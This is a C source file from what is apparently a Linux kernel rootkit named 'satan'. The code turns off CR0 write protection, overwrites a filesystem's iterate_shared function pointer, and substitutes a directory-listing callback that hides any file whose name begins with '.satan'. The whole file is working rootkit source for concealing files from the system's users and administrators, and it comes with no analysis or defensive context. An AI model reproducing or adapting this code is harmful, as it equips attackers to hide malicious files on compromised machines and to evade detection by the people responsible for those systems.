// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#include "file.h"

#include <linux/fs.h>

#include "util.h"

#define SECRET_FILE ".satan"

static int ret = 0;
static struct file *filp = NULL;
static struct file_operations *f_op = NULL;

static int (*real_iterate_shared) (struct file *, struct dir_context *);
static filldir_t real_filldir;

static int satan_iterate_shared(struct file *filp, struct dir_context *ctx);
static int satan_filldir(struct dir_context *ctx, const char *name, int namlen,
                         loff_t offset, u64 ino, unsigned d_type);


void satan_hijack_f_op(const char *path)
{ 
        pr_info("satan: opening %s\n", path);
        filp = filp_open(path, O_RDONLY, 0);

        if (IS_ERR(filp)) {
                pr_alert("satan: failed to open %s\n", path);
                
        } else {
                f_op = (struct file_operations *) filp->f_op;
                real_iterate_shared = f_op->iterate_shared;

                CR0_WP_DISABLE {
                        pr_info("satan: iterate_shared: %p\n", f_op->iterate_shared);
                        pr_alert("satan: hijacking iterate from %p to %p.\n",
                                 f_op->iterate_shared, satan_iterate_shared);
                        f_op->iterate_shared = satan_iterate_shared;
                } CR0_WP_DISABLE_END
        }
}

void satan_unhijack_f_op(const char *path)
{
        filp = filp_open(path, O_RDONLY, 0);

        if (IS_ERR(filp)) {
                //pr_alert("satan: failed to open %s: %s\n",
                //         path, PTR_ERR(filp));
                
        } else {
                CR0_WP_DISABLE {
                        pr_info("satan: restoring iterate_shared from %p to %p\n",
                                f_op->iterate_shared, real_iterate_shared);
                        f_op->iterate_shared = real_iterate_shared;
                } CR0_WP_DISABLE_END
        }
}

static int satan_iterate_shared(struct file *filp, struct dir_context *ctx)
{
        real_filldir = ctx->actor;

        // ->iterate_shared() will call ctx->actor, i.e., filldir()
        // Here we'll replace the original filldir() with our version of filldir().
        *(filldir_t *)&ctx->actor = satan_filldir;
        ret = real_iterate_shared(filp, ctx);
        *(filldir_t *)&ctx->actor = real_filldir;

        return ret;
}

static int satan_filldir(struct dir_context *ctx, const char *name, int namlen,
                         loff_t offset, u64 ino, unsigned d_type)
{
        if (!strncmp(name, SECRET_FILE, strlen(SECRET_FILE))) {
                pr_info("satan: hiding: %s", name);
                return 0;
        }

        /* pr_cont("%s ", name); */

        // Let the original filldir() finish its job.
        return real_filldir(ctx, name, namlen, offset, ino, d_type);
}
